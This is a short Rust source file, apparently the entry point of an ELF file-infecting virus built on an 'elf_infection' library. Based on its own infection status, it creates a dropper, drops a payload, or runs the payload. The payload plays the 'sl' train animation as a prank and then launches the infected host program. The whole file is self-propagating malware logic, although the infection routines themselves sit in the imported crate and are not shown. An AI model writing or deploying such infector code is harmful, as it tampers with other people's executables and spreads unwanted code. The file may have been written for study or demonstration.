use elf_infection::infect::{
    InfectionStatus, create_dropper, drop_payload, get_own_infection_status, spawn_infected_program,
};
use sl::sl;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    match get_own_infection_status() {
        InfectionStatus::Origin => create_dropper()?,
        InfectionStatus::Dropper => drop_payload()?,
        InfectionStatus::Infected => payload(),
    }

    Ok(())
}

fn fun_stuff() {
    let sl_args: Vec<String> = vec![String::new(); 1];
    sl(&sl_args);
}

fn payload() {
    fun_stuff();
    let _ = spawn_infected_program();
}
